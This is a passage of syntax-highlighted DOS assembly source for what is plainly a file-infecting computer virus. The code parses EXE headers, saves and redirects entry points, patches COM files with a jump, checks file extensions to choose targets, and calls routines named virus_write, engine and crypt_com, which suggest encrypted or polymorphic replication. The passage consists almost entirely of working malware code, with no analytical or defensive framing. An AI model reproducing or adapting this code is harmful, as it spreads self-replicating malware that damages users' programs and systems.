      </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">si.mzExtraBytes</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">
      </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">__1</span><span class="sc0">
      </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
      </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">si.mzCheckSum</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
      </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">__1</span><span class="sc0">
      </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">si.mzRelocItems</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
      </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">__1</span><span class="sc0">
      </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">si.mzHeaderSize</span><span class="sc4">]</span><span class="sc0">
      </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc5">HdrSize</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
      </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FFFFh</span><span class="sc0"> </span><span class="sc6">shr</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">
      </span><span class="sc6">ja</span><span class="sc0">  </span><span class="sc5">__1</span><span class="sc0">
      </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">
      </span><span class="sc6">shl</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc0">
      </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">si.mzRelocTable</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
      </span><span class="sc6">jae</span><span class="sc0">  </span><span class="sc5">__1</span><span class="sc0">       
      </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">si.mzInitIP</span><span class="sc4">]</span><span class="sc0">
      </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc5">OldIP</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
      </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">si.mzInitCS</span><span class="sc4">]</span><span class="sc0">
      </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc5">OldCS</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
      </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">si.mzInitSS</span><span class="sc4">]</span><span class="sc0">
      </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">
      </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">__1</span><span class="sc0">  
      </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc5">OldSS</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">
      </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">si.mzInitSP</span><span class="sc4">]</span><span class="sc0">
      </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc5">OldSP</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">      
      </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">si.mzRelocItems</span><span class="sc4">]</span><span class="sc0">
      </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">RelocNum</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
      </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">si.mzRelocTable</span><span class="sc4">]</span><span class="sc0">
      </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">RelocOfs</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
      </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">fsize1</span><span class="sc0">
      </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">fsize2</span><span class="sc0">
      </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">10h</span><span class="sc0">
      </span><span class="sc6">div</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">
      </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">si.mzHeaderSize</span><span class="sc4">]</span><span class="sc0">
      </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">si.mzInitCS</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
      </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">si.mzInitIP</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">
      </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
      </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2048</span><span class="sc0"> </span><span class="sc6">shr</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">
      </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">random</span><span class="sc0">
      </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">
      </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">
      </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">
      </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">si.mzInitSS</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
      </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FFFEh</span><span class="sc4">-</span><span class="sc2">0DE00h</span><span class="sc0">
      </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">random</span><span class="sc0">
      </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0DE00h</span><span class="sc0">
      </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">si.mzInitSP</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">  
      </span><span class="sc1">;   </span><span class="sc0">
      </span><span class="sc1">;   COM  ?</span><span class="sc0">
      </span><span class="sc1">;   EXE </span><span class="sc0">
      </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">fsize1</span><span class="sc0">
      </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">fsize2</span><span class="sc0">
      </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">
      </span><span class="sc6">jns</span><span class="sc0"> </span><span class="sc5">__4</span><span class="sc0">  
      </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">max_fsize</span><span class="sc0">
      </span><span class="sc6">ja</span><span class="sc0">  </span><span class="sc5">__4</span><span class="sc0"> 
      </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">
      </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1Ch</span><span class="sc0">
</span><span class="sc5">__3</span><span class="sc4">:</span><span class="sc0">
      </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ch</span><span class="sc0">
      </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">
      </span><span class="sc6">loop</span><span class="sc0"> </span><span class="sc5">__3</span><span class="sc0">
      </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">use_it</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">90h</span><span class="sc0">
      </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">
      </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">
      </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">gen_header</span><span class="sc0">
      </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">
      </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0E9h</span><span class="sc0">
      </span><span class="sc6">stosb</span><span class="sc0">
      </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">fsize1</span><span class="sc0">
      </span><span class="sc1">; fsize1-(di-dx)-3 </span><span class="sc0">
      </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">
      </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">
      </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">
      </span><span class="sc6">stosw</span><span class="sc0">
      </span><span class="sc6">mov</span><span class="sc0">  </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">fsize1</span><span class="sc0">
      </span><span class="sc6">add</span><span class="sc0">  </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">100h</span><span class="sc0">
      </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">gen_body</span><span class="sc0">
      </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">virus_write</span><span class="sc0">
      </span><span class="sc6">jc</span><span class="sc0">  </span><span class="sc5">__7</span><span class="sc0">
      </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">write_header</span><span class="sc0">      
      </span><span class="sc6">jc</span><span class="sc0">  </span><span class="sc5">__7</span><span class="sc0">
      </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">crypt_com</span><span class="sc0">
</span><span class="sc5">__4</span><span class="sc4">:</span><span class="sc0">
      </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0"> 
      </span><span class="sc6">mov</span><span class="sc0">  </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">si.mzInitIP</span><span class="sc4">]</span><span class="sc0">
      </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">gen_body</span><span class="sc0">
      </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">virus_write</span><span class="sc0"> 
      </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">
      </span><span class="sc6">jc</span><span class="sc0"> </span><span class="sc5">__7</span><span class="sc0">
      </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4201h</span><span class="sc0">
      </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">
      </span><span class="sc6">cwd</span><span class="sc0">
      </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc5">IntConst</span><span class="sc0">
      </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">200h</span><span class="sc0">
      </span><span class="sc6">div</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">
      </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">
      </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">__5</span><span class="sc0">
      </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
</span><span class="sc5">__5</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">si.mzPages</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
      </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">si.mzExtraBytes</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">
      </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">write_header</span><span class="sc0">
</span><span class="sc5">__7</span><span class="sc4">:</span><span class="sc0">
      </span><span class="sc6">ret</span><span class="sc0">  
      </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc5">gen_body</span><span class="sc4">:</span><span class="sc0">
      </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">
      </span><span class="sc6">mov</span><span class="sc0">  </span><span class="sc8">es</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">buf_seg</span><span class="sc4">]</span><span class="sc0">
      </span><span class="sc6">sub</span><span class="sc0">  </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">
      </span><span class="sc6">sub</span><span class="sc0">  </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">
      </span><span class="sc6">mov</span><span class="sc0">  </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">vl</span><span class="sc4">/</span><span class="sc2">2</span><span class="sc4">)+</span><span class="sc2">1</span><span class="sc0">
      </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">
      </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">engine</span><span class="sc0">
      </span><span class="sc6">pop</span><span class="sc0">  </span><span class="sc8">bx</span><span class="sc0">
      </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">
      </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">fsize1</span><span class="sc0">
      </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">fsize2</span><span class="sc0">
      </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">
      </span><span class="sc6">adc</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
      </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">101</span><span class="sc0">
      </span><span class="sc6">div</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">
      </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">
      </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
      </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">     
      </span><span class="sc6">mul</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">       
      </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">fsize1</span><span class="sc0">
      </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
      </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">
      </span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">
</span><span class="sc5">__1</span><span class="sc4">:</span><span class="sc0">      
      </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">100h</span><span class="sc0">
      </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">random</span><span class="sc0">
      </span><span class="sc6">stosb</span><span class="sc0">
      </span><span class="sc6">loop</span><span class="sc0"> </span><span class="sc5">__1</span><span class="sc0">
      </span><span class="sc6">pop</span><span class="sc0">  </span><span class="sc8">cx</span><span class="sc0"> 
      </span><span class="sc6">pop</span><span class="sc0">  </span><span class="sc8">es</span><span class="sc0">
      </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">test_rash</span><span class="sc4">:</span><span class="sc0">
      </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">
      </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">di</span><span class="sc4">-</span><span class="sc2">5</span><span class="sc4">]</span><span class="sc0">
      </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc2">2020h</span><span class="sc0">
      </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">di</span><span class="sc4">-</span><span class="sc2">5</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">]</span><span class="sc0">
      </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc2">2020h</span><span class="sc0"> 
      </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc12">'C'</span><span class="sc0"> </span><span class="sc6">shl</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc4">)+</span><span class="sc2">0Eh</span><span class="sc0">
      </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">not_com</span><span class="sc0">
      </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'MO'</span><span class="sc0">
      </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">bad_bad</span><span class="sc0"> 
</span><span class="sc5">_ex_check</span><span class="sc4">:</span><span class="sc0">
      </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">not_com</span><span class="sc4">:</span><span class="sc0">
      </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc12">'E'</span><span class="sc0"> </span><span class="sc6">shl</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc4">)+</span><span class="sc2">0Eh</span><span class="sc0">
      </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">bad_bad</span><span class="sc0">
      </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'EX'</span><span class="sc0">
      </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">_ex_check</span><span class="sc0">
</span><span class="sc5">bad_bad</span><span class="sc4">:</span><span class="sc0">
      </span><span class="sc6">stc</span><span class="sc0">
      </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">_ex_check</span><span class="sc0">

</span><span class="sc5">write_header</span><span class="sc4">:</span><span class="sc0">
      </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">seek_beg</span><span class="sc0">
      </span><span class="sc6">lea</span><span class="sc0">  </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">exe_header</span><span class="sc0">
      </span><span class="sc6">mov</span><span class="sc0">  </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1Ch</span><span class="sc0">
      </span><span class="sc6">jmp</span><span class="sc0">  </span><span class="sc5">write</span><span class="sc0">  

</span><span class="sc5">read</span><span class="sc4">:</span><span class="sc0">
      </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3Fh</span><span class="sc0">
      </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc5">IntConst</span><span class="sc0">
</span><span class="sc5">t_write</span><span class="sc4">:</span><span class="sc0">
      </span><span class="sc6">jc</span><span class="sc0">  </span><span class="sc5">__1</span><span class="sc0">
      </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">
      </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">__1</span><span class="sc0">
      </span><span class="sc6">stc</span><span class="sc0">
</span><span class="sc5">__1</span><span class="sc4">:</span><span class="sc0">
      </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">write</span><span class="sc4">:</span><span class="sc0">
      </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">40h</span><span class="sc0">
      </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc5">IntConst</span><span class="sc0">
      </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">t_write</span><span class="sc0">
</span><span class="sc5">seek_beg</span><span class="sc4">:</span><span class="sc0">
      </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4200h</span><span class="sc0">
      </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">
      </span><span class="sc6">cwd</span><span class="sc0">
      </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc5">IntConst</span><span class="sc0">
      </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">seek_end</span><span class="sc4">:</span><span class="sc0">
      </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4202h</span><span class="sc0">
      </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">
      </span><span class="sc6">cwd</span><span class="sc0"> 
      </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc5">IntConst</span><span class="sc0">
      </span><span class="sc6">ret</span><span class="sc0"> 

</span><span class="sc5">random</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc9">org</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">2</span><span class="sc0">
</span><span class="sc5">A</span><span class="sc0">   </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc9">org</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">2</span><span class="sc0">
</span><span class="sc5">B</span><span class="sc0">   </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">8405h</span><span class="sc0">
    </span><span class="sc6">mul</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">
    </span><span class="sc6">shl</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ch</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">
    </span><span class="sc6">shl</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">dh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">bl</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">5</span><span class="sc0">  
    </span><span class="sc6">shl</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">dh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">bl</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
    </span><span class="sc6">adc</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
